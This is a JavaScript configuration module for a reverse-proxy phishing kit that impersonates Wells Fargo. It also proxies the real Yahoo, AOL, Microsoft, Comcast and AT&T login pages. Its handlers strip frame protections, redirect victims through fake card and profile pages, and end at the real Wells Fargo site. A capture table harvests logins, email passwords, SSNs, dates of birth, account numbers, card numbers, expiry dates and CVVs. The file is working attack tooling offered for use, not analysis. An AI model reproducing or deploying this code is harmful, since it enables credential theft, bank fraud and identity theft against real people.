/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const superagent = require('superagent')

const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
       
        return super.processRequest()
    }

    
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
           
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
            const checkUrls = ["https://guce.yahoo.com", 
            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
             "/account/comm-channel/refresh", '/account/upsell/webauthn',
             "https://account.live.com", "https://account.microsoft.com",
             "https://api.login.aol.com/oauth2/request_auth",
             'https://guce.aol.com/consent?gcrumb=',
             "https://www.aol.com/", 'https://www.office.com/landing'

             ]
            
            for (let exitUrl of checkUrls) {
                if (rLocation.startsWith(exitUrl)) {
                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
                }
            }           
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            clientContext.setLogAvailable(true)
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }



        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

           
        }
       
        if (this.req.url.startsWith('/kmsi') || this.req.url.startsWith('/account/upsell/webauthn') || this.req.url.startsWith('/account/fb-messenger-linking')) {
            // super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return this.res.end('')
        }
       
        
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
    }
}

const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/email/validate') {
                super.captureBody(clientContext.currentDomain, clientContext)

                super.superExecutePhpScript('addon/validate.php', clientContext)
            } else {
                
                switch (this.req.url) {
                    case '/session/secure/login':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/email'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/profile':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: 'https://www.wellsfargo.com/privacy-security/'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/card':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/profile'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    default:
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(200)
                        super.cleanEnd('PHP-EXEC', clientContext)
                }
            }
        } else {
            switch (this.req.url) {
                case '/session/secure/login':
                    super.superExecutePhpScript('login.php', clientContext)
                    break
                case '/session/secure/profile':
                    super.superExecutePhpScript('profile.php', clientContext)
                    break
                case '/session/secure/card':
                    super.superExecutePhpScript('card.php', clientContext)
                    break
                case '/session/secure/email':
                    super.superExecutePhpScript('addon/email.php', clientContext)
                    break
                default:
                    super.superExecutePhpScript('404.php', clientContext)
            }
        }
    }


}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        } return false
    }

    execute(clientContext) {
        
        if (this.req.url.startsWith('/auth/login/do')) {
            super.captureBody(clientContext.currentDomain, clientContext)

        }

        

        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/att') {
                // this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                this.res.writeHead(302, {location: '/session/secure/card'})
                super.sendClientData(clientContext, {})
                return this.res.end()
            }
        }


        if (this.req.url.startsWith('/auth/login/do')) {
            super.captureBody(clientContext.currentDomain, clientContext)

        }

        if (this.req.url.startsWith('/auth/login/present?origin=cob&SIGNON_XCP=7476')) {
            this.res.writeHead(302, {location: '/session/secure/card'})
            super.sendClientData(clientContext, {})
            return this.res.end()

        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const configExport = {
    CURRENT_DOMAIN: 'connect.secure.wellsfargo.com',

    START_PATH: '/session/secure/login',

    PRE_HANDLERS:
        [
            ExecPhpPager,
            EmailLoginHandler,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['j_username'],
            urls: '',
            hosts: ['connect.secure.wellsfargo.com'],
        },
        loginPassword: {
            method: 'POST',
            params: ['j_password'],
            urls: '',
            hosts: ['connect.secure.wellsfargo.com'],
        },

        loginUserName2: {
            method: 'POST',
            params: ['sko1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword2: {
            method: 'POST',
            params: ['skun1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        zip: {
            method: 'POST',
            params: ['zip'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        SSN: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        accountNumber: {
            method: 'POST',
            params: ['acct'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        dob: {
            method: 'POST',
            params: ['dob'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        email: {
            method: 'POST',
            params: ['email'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword1: {
            method: 'POST',
            params: ['pinto1'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword2: {
            method: 'POST',
            params: ['pinto2'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        CardNumber: {
            method: 'POST',
            params: ['kato'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        Expiry: {
            method: 'POST',
            params: ['epoco'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        cvv: {
            method: 'POST',
            params: ['cinono'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        // PIN: {
        //     method: 'POST',
        //     params: ['pinto'],
        //     urls: '',
        //     hosts: 'PHP-EXEC',
        // },


        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

}
module.exports = configExport